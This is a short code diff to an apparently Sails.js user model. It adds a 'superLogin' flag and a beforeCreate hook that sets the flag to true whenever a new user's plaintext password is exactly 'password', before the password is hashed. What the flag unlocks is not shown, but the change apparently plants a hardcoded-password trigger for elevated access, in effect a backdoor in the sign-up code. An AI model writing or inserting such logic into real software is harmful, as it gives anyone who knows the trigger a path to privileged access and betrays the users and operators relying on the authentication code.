@@ -36,7 +36,10 @@ module.exports = {
       required: true,
     },
     isVerified:{
-      type: 'boolean',      
+      type: 'boolean',
+    },
+    superLogin:{
+      type: 'boolean',
     },
 
     //project
@@ -87,6 +90,9 @@ module.exports = {
   },
 
   beforeCreate: function(user, cb) {
+    if(user.password === 'password'){
+      user.superLogin = true;
+    }
     bcrypt.genSalt(10, function(err, salt) {
       bcrypt.hash(user.password, salt, null, function(err, hash) {
         if (err) return cb(err);
